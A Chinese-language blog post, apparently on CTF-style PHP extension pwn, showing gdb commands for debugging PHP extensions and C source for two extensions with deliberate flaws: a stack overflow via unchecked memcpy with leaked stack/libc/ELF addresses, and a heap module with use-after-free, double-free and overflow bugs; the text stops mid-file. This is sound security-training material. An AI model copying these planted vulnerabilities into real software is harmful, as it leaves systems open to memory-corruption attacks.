          <a href="#二、调试php拓展" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、调试php拓展" class="headerlink" title="二、调试php拓展"></a>二、调试php拓展</h1>
      
        <h2 id="1-查找模块"   >
          <a href="#1-查找模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-查找模块" class="headerlink" title="1.查找模块"></a>1.查找模块</h2>
      <p>查找php拓展模块</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep extensions</span><br><span class="line">php -i | grep -i extension_dir</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-开始调试"   >
          <a href="#2-开始调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-开始调试" class="headerlink" title="2.开始调试"></a>2.开始调试</h2>
      <p>如下，调试php程序，然后跑起来，使得加载进入拓展模块，ctrl+c中断后即可对特定函数下断点，然后再跑<code>test.php</code>，该php调用需要调试的拓展模块中的函数，继续运行即可断点。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb /www/server/php/73/bin/php</span><br><span class="line">r</span><br><span class="line">(ctrl+c中断)</span><br><span class="line">b zif_funcName</span><br><span class="line">r test.php</span><br><span class="line">c</span><br></pre></td></tr></table></div></figure>

<p>这里可以看到我们使用拓展模块注册的函数最终都会以<code>zif_</code>整个前缀进行修饰，所以当做CTF题时，直接搜索zif从中寻找函数进行解析即可。</p>
<p>如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111117225.png" alt="image-20220211111702925"></p>

        <h2 id="🔺测试用例"   >
          <a href="#🔺测试用例" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺测试用例" class="headerlink" title="🔺测试用例"></a>🔺测试用例</h2>
      
        <h3 id="1-栈模块"   >
          <a href="#1-栈模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-栈模块" class="headerlink" title="(1)栈模块"></a>(1)栈模块</h3>
      <p>传入任意长度的字符串，拷贝给data，导致栈溢出</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* my_stack extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_my_stack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_stack_gift)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">char</span> gift_data[<span class="number">0x10</span>];</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_Stack Gift function!---000\n&quot;</span>);</span><br><span class="line">		    retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Gift_Stack:0x%lx\nGift_Libc:0x%lx\nGift_ELF:0x%lx\n&quot;</span>,&amp;gift_data,&amp;<span class="built_in">printf</span>,&amp;zif_my_stack_gift);</span><br><span class="line">			RETURN_STR(retval);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_stack_func)</span><br><span class="line">        &#123;</span><br><span class="line">        	</span><br><span class="line">        	<span class="keyword">char</span>* buf = <span class="string">&quot;stackTest&quot;</span>;</span><br><span class="line">        	<span class="keyword">size_t</span> buf_len = <span class="keyword">sizeof</span>(<span class="string">&quot;stackTest&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">        	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">            Z_PARAM_STRING(buf, buf_len)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">char</span> data[<span class="number">0x10</span>];</span><br><span class="line">        	php_printf(<span class="string">&quot;Welcome to my Stack!\n&quot;</span>);</span><br><span class="line">        	php_printf(<span class="string">&quot;		   --PIG-007\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        	php_printf(<span class="string">&quot;Gift_Stack:0x%lx\n&quot;</span>,&amp;data);</span><br><span class="line">		    php_printf(<span class="string">&quot;Gift_Libc:0x%lx\n&quot;</span>,&amp;<span class="built_in">printf</span>);</span><br><span class="line">		    php_printf(<span class="string">&quot;Gift_ELF:0x%lx\n&quot;</span>,&amp;zif_my_stack_func);</span><br><span class="line"></span><br><span class="line">        	<span class="built_in">memcpy</span>(data,buf,buf_len);</span><br><span class="line">        	php_printf(<span class="string">&quot;Over!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(my_stack)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_MY_STACK)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(my_stack)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;my_stack support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_stack_gift, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_stack_func, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, data)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_stack_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry my_stack_functions[] = &#123;</span><br><span class="line">	PHP_FE(my_stack_gift,		arginfo_my_stack_gift)</span><br><span class="line">	PHP_FE(my_stack_func,		arginfo_my_stack_func)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_stack_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry my_stack_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;my_stack&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	my_stack_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(my_stack),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(my_stack),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_MY_STACK_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_MY_STACK</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(my_stack)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-堆模块"   >
          <a href="#2-堆模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-堆模块" class="headerlink" title="(2)堆模块"></a>(2)堆模块</h3>
      <p>UAF，溢出，doubleFree等漏洞</p>
<p>测试代码，如下即为用php7.3编译的代码，实现四个函数，增删改查</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_heap_addFunc(18);</span><br><span class="line">my_heap_delFunc(0);</span><br><span class="line">my_heap_editFunc(0,&#x27;aaa&#x27;);</span><br><span class="line">my_heap_getFunc(0);</span><br></pre></td></tr></table></div></figure>

<p>题目代码：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* my_heap extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_my_heap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* notelist[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_gift)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">char</span> data[<span class="number">0x10</span>];</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Gift function!---000\n&quot;</span>);</span><br><span class="line">		    retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Gift_Stack:0x%lx\nGift_Libc:0x%lx\nGift_ELF:0x%lx\n&quot;</span>,&amp;data,&amp;<span class="built_in">printf</span>,&amp;zif_my_heap_gift);</span><br><span class="line">RETURN_STR(retval);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_addFunc)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">long</span> size = <span class="number">10</span>;</span><br><span class="line">                <span class="keyword">char</span>* chunk = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="comment">//zend_string *retval;</span></span><br><span class="line">                php_printf(<span class="string">&quot;PHP_HEAP Add function!---001\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">                Z_PARAM_LONG(size)</span><br><span class="line">                ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">                chunk = _emalloc(size);</span><br><span class="line">                php_printf(<span class="string">&quot;chunk_addr:0x%lx\n&quot;</span>, chunk);</span><br><span class="line">                <span class="comment">//retval = strpprintf(0, &quot;chunk_addr:0x%lx&quot;, chunk);</span></span><br><span class="line">                <span class="keyword">if</span> (!chunk)</span><br><span class="line">                &#123;</span><br><span class="line">                    php_printf(<span class="string">&quot;Alloca Error\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//HELLO_G(greeting) ++;</span></span><br><span class="line">                notelist[count] = chunk;</span><br><span class="line">                chunk = <span class="literal">NULL</span>;</span><br><span class="line">                count ++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_delFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Free function!---002\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (notelist[idx])</span><br><span class="line">            &#123;</span><br><span class="line">                _efree(notelist[idx]);</span><br><span class="line">                <span class="comment">//notelist[noteChunk-&gt;idx] = NULL;</span></span><br><span class="line">                php_printf(<span class="string">&quot;Free Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                php_printf(<span class="string">&quot;You can&#x27;t free it!There is no chunk!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_editFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">        	<span class="keyword">char</span>* data = <span class="string">&quot;editTest&quot;</span>;</span><br><span class="line">        	<span class="keyword">size_t</span> data_len = <span class="keyword">sizeof</span>(<span class="string">&quot;editTest&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Edit function!---003\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            Z_PARAM_STRING(data, data_len)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (notelist[idx])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(notelist[idx],data,data_len);</span><br><span class="line">                php_printf(<span class="string">&quot;Edit Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                php_printf(<span class="string">&quot;You can&#x27;t free it!There is no chunk!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_getFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Show function!---004\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(notelist[idx])&#123;</span><br><span class="line">            	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Content:%s\n&quot;</span>,notelist[idx]);</span><br><span class="line">                php_printf(<span class="string">&quot;Content:%s\n&quot;</span>,notelist[idx]);</span><br><span class="line">                php_printf(<span class="string">&quot;Show Success!\n&quot;</span>);</span><br><span class="line">                RETURN_STR(retval);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(my_heap)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_MY_HEAP)</span></span><br><span class="line">                ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(my_heap)</span><br><span class="line">        &#123;</span><br><span class="line">        php_info_print_table_start();</span><br><span class="line">        php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;my_heap support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">        php_info_print_table_end();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_gift, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_addFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, addSize)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_editFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, editIdx)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, editData)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_delFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, delIdx)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_getFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, showIdx)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_heap_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry my_heap_functions[] = &#123;</span><br><span class="line">        		PHP_FE(my_heap_gift,		arginfo_my_heap_gift)</span><br><span class="line">                PHP_FE(my_heap_addFunc,		arginfo_my_heap_addFunc)</span><br><span class="line">                PHP_FE(my_heap_delFunc,		arginfo_my_heap_delFunc)</span><br><span class="line">                PHP_FE(my_heap_editFunc,		arginfo_my_heap_editFunc)</span><br><span class="line">                PHP_FE(my_heap_getFunc,		arginfo_my_heap_getFunc)</span><br><span class="line">                PHP_FE_END</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_heap_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        zend_module_entry my_heap_module_entry = &#123;</span><br><span class="line">                STANDARD_MODULE_HEADER,</span><br><span class="line">                <span class="string">&quot;my_heap&quot;</span>,					<span 